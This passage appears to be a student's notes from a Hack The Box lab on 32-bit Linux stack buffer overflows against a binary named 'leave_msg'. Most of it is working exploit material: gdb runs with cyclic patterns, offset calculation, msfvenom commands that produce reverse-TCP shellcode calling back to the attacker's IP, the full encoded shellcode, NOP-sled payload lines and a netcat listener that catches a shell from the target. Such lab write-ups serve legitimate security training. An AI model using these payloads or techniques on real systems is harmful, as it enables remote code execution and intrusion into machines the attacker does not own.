5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2D
```

```sh
htb-student@nixbof32skills:~$ gdb ./leave_msg

Reading symbols from ./leave_msg...(no debugging symbols found)...done.
(gdb) run Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2D
Starting program: /home/htb-student/leave_msg ...

Program received signal SIGSEGV, Segmentation fault.
0x37714336 in ?? ()

```

```sh
┌──(kali㉿kali)-[/usr/share/metasploit-framework/tools/exploit]
└─$ ./pattern_offset.rb -q 0x37714336
[*] Exact match at offset 2060
```

finding bad chars:
`\x00\x09\x0a\x20`

```sh
┌──(kali㉿kali)-[~]
└─$ msfvenom -p linux/x86/shell_reverse_tcp lhost=10.10.14.245 lport=443 --format c --arch x86 --platform linux --bad-chars "\x00\x09\x0a\x20"                
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 95 (iteration=0)
x86/shikata_ga_nai chosen with final size 95
Payload size: 95 bytes
Final size of c file: 425 bytes
unsigned char buf[] = 
"\xd9\xc3\xba\xaa\xca\x9c\x9b\xd9\x74\x24\xf4\x58\x2b\xc9"
"\xb1\x12\x83\xc0\x04\x31\x50\x13\x03\xfa\xd9\x7e\x6e\xcb"
"\x06\x89\x72\x78\xfa\x25\x1f\x7c\x75\x28\x6f\xe6\x48\x2b"
"\x03\xbf\xe2\x13\xe9\xbf\x4a\x15\x08\xd7\x46\xef\xe4\xd2"
"\x3f\xed\xf8\x1d\x7b\x78\x19\xad\x1d\x2b\x8b\x9e\x52\xc8"
"\xa2\xc1\x58\x4f\xe6\x69\x0d\x7f\x74\x01\xb9\x50\x55\xb3"
"\x50\x26\x4a\x61\xf0\xb1\x6c\x35\xfd\x0c\xee";
```

```sh
htb-student@nixbof32skills:~$ gdb ./leave_msg


```

```
0xffffccd8:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xffffcce0:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xffffcce8:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xffffccf0:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xffffccf8:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xffffcd00:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xffffcd08:     0x90    0x90    0x90    0x90    0x90    0xd9    0xc3    0xba
0xffffcd10:     0xaa    0xca    0x9c    0x9b    0xd9    0x74    0x24    0xf4
0xffffcd18:     0x58    0x2b    0xc9    0xb1    0x12    0x83    0xc0    0x04
---Type <return> to continue, or q <return> to quit---q
Quit
(gdb) run $(python -c 'print "\x55" * (2060 - 256 - 95) + "\x90" * 256 + "\xd9\xc3\xba\xaa\xca\x9c\x9b\xd9\x74\x24\xf4\x58\x2b\xc9\xb1\x12\x83\xc0\x04\x31\x50\x13\x03\xfa\xd9\x7e\x6e\xcb\x06\x89\x72\x78\xfa\x25\x1f\x7c\x75\x28\x6f\xe6\x48\x2b\x03\xbf\xe2\x13\xe9\xbf\x4a\x15\x08\xd7\x46\xef\xe4\xd2\x3f\xed\xf8\x1d\x7b\x78\x19\xad\x1d\x2b\x8b\x9e\x52\xc8\xa2\xc1\x58\x4f\xe6\x69\x0d\x7f\x74\x01\xb9\x50\x55\xb3\x50\x26\x4a\x61\xf0\xb1\x6c\x35\xfd\x0c\xee" + "\x90\xcc\xff\xff"')
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/htb-student/leave_msg $(python -c 'print "\x55" * (2060 - 256 - 95) + "\x90" * 256 + "\xd9\xc3\xba\xaa\xca\x9c\x9b\xd9\x74\x24\xf4\x58\x2b\xc9\xb1\x12\x83\xc0\x04\x31\x50\x13\x03\xfa\xd9\x7e\x6e\xcb\x06\x89\x72\x78\xfa\x25\x1f\x7c\x75\x28\x6f\xe6\x48\x2b\x03\xbf\xe2\x13\xe9\xbf\x4a\x15\x08\xd7\x46\xef\xe4\xd2\x3f\xed\xf8\x1d\x7b\x78\x19\xad\x1d\x2b\x8b\x9e\x52\xc8\xa2\xc1\x58\x4f\xe6\x69\x0d\x7f\x74\x01\xb9\x50\x55\xb3\x50\x26\x4a\x61\xf0\xb1\x6c\x35\xfd\x0c\xee" + "\x90\xcc\xff\xff"')

Program received signal SIGSEGV, Segmentation fault.
0xffffcd58 in ?? ()
(gdb) Quit
(gdb) s
Cannot find bounds of current function
(gdb) run $(python -c 'print "\x55" * (2060 - 256 - 95) + "\x90" * 256 + "\xd9\xc3\xba\xaa\xca\x9c\x9b\xd9\x74\x24\xf4\x58\x2b\xc9\xb1\x12\x83\xc0\x04\x31\x50\x13\x03\xfa\xd9\x7e\x6e\xcb\x06\x89\x72\x78\xfa\x25\x1f\x7c\x75\x28\x6f\xe6\x48\x2b\x03\xbf\xe2\x13\xe9\xbf\x4a\x15\x08\xd7\x46\xef\xe4\xd2\x3f\xed\xf8\x1d\x7b\x78\x19\xad\x1d\x2b\x8b\x9e\x52\xc8\xa2\xc1\x58\x4f\xe6\x69\x0d\x7f\x74\x01\xb9\x50\x55\xb3\x50\x26\x4a\x61\xf0\xb1\x6c\x35\xfd\x0c\xee" + "\x90\xcc\xff\xff"')
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/htb-student/leave_msg $(python -c 'print "\x55" * (2060 - 256 - 95) + "\x90" * 256 + "\xd9\xc3\xba\xaa\xca\x9c\x9b\xd9\x74\x24\xf4\x58\x2b\xc9\xb1\x12\x83\xc0\x04\x31\x50\x13\x03\xfa\xd9\x7e\x6e\xcb\x06\x89\x72\x78\xfa\x25\x1f\x7c\x75\x28\x6f\xe6\x48\x2b\x03\xbf\xe2\x13\xe9\xbf\x4a\x15\x08\xd7\x46\xef\xe4\xd2\x3f\xed\xf8\x1d\x7b\x78\x19\xad\x1d\x2b\x8b\x9e\x52\xc8\xa2\xc1\x58\x4f\xe6\x69\x0d\x7f\x74\x01\xb9\x50\x55\xb3\x50\x26\x4a\x61\xf0\xb1\x6c\x35\xfd\x0c\xee" + "\x90\xcc\xff\xff"')

Program received signal SIGSEGV, Segmentation fault.
0xffffcd58 in ?? ()
(gdb) run $(python -c 'print "\x55" * (2060 - 256 - 28) + "\x90" * 256 + "\x48\xb9\x2f\x62\x69\x6e\x2f\x73\x68\x11\x48\xc1\xe1\x08\x48\xc1\xe9\x08\x51\x48\x8d\x3c\x24\x48\x31\xd2\xb0\x3" + "\x90\xcc\xff\xff"')
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/htb-student/leave_msg $(python -c 'print "\x55" * (2060 - 256 - 28) + "\x90" * 256 + "\x48\xb9\x2f\x62\x69\x6e\x2f\x73\x68\x11\x48\xc1\xe1\x08\x48\xc1\xe9\x08\x51\x48\x8d\x3c\x24\x48\x31\xd2\xb0\x3" + "\x90\xcc\xff\xff"')
ValueError: invalid \x escape

Program received signal SIGSEGV, Segmentation fault.
0xf7e729c8 in ?? () from /lib32/libc.so.6
(gdb) run $(python -c 'print "\x55" * (2060 - 256 - 28) + "\x90" * 256 + "\x48\xb9\x2f\x62\x69\x6e\x2f\x73\x68\x11\x48\xc1\xe1\x08\x48\xc1\xe9\x08\x51\x48\x8d\x3c\x24\x48\x31\xd2\xb0\x3" + "\x66\x66\x66\x66"')
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/htb-student/leave_msg $(python -c 'print "\x55" * (2060 - 256 - 28) + "\x90" * 256 + "\x48\xb9\x2f\x62\x69\x6e\x2f\x73\x68\x11\x48\xc1\xe1\x08\x48\xc1\xe9\x08\x51\x48\x8d\x3c\x24\x48\x31\xd2\xb0\x3" + "\x66\x66\x66\x66"')
ValueError: invalid \x escape

Program received signal SIGSEGV, Segmentation fault.
0xf7e729c8 in ?? () from /lib32/libc.so.6
(gdb) client_loop: send disconnect: Broken pipe
                                                  
```

one more tab with tests deleted


```sh
┌──(kali㉿kali)-[~]
└─$ nc -nvlp 443                
listening on [any] 443 ...
connect to [10.10.14.245] from (UNKNOWN) [10.129.203.18] 33802

ls
pwd
^C

┌──(kali㉿kali)-[~]
└─$ nc -nvlp 443
listening on [any] 443 ...
connect to [10.10.14.245] from (UNKNOWN) [10.129.203.18] 33838
pwd
^C
  
```

---

new try doing it locally instead of trying to connect to my machine:

`msfvenom -p linux/x86/shell_reverse_tcp lhost=127.0.0.1 lport=31337 --format c --arch x86 --platform linux --bad-chars "\x00\x09\x0a\x20"`

```
\xd9\xc9\xb8\xb5\xa8\xcc\x7b\xd9\x74\x24\xf4\x5a\x29\xc9\xb1\x12\x31\x42\x17\x03\x42\x17\x83\x77\xac\x2e\x8e\x46\x76\x59\x92\xfb\xcb\xf5\x3f\xf9\x42\x18\x0f\x9b\x99\x5b\xe3\x3a\x92\x63\xc9\x3c\x9b\xe2\x28\x54\x63\x15\xcb\xa5\xf3\x17\xcb\xdf\x6a\x91\x2a\xaf\x0b\xf1\xfd\x9c\x60\xf2\x74\xc3\x4a\x75\xd4\x6b\x3b\x59\xaa\x03\xab\x8a\x63\xb1\x42\x5c\x98\x67\xc6\xd7\xbe\x37\xe3\x2a\xc0
```

```
run $(python -c 'print "\x55" * (2060 - 256 - 95) + "\x90" * 256 + "\xd9\xc9\xb8\xb5\xa8\xcc\x7b\xd9\x74\x24\xf4\x5a\x29\xc9\xb1\x12\x31\x42\x17\x03\x42\x17\x83\x77\xac\x2e\x8e\x46\x76\x59\x92\xfb\xcb\xf5\x3f\xf9\x42\x18\x0f\x9b\x99\x5b\xe3\x3a\x92\x63\xc9\x3c\x9b\xe2\x28\x54\x63\x15\xcb\xa5\xf3\x17\xcb\xdf\x6a\x91\x2a\xaf\x0b\xf1\xfd\x9c\x60\xf2\x74\xc3\x4a\x75\xd4\x6b\x3b\x59\xaa\x03\xab\x8a\x63\xb1\x42\x5c\x98\x67\xc6\xd7\xbe\x37\xe3\x2a\xc0" + "\xe8\xd6\xff\xff"')

x/2000xb $esp+2200

```

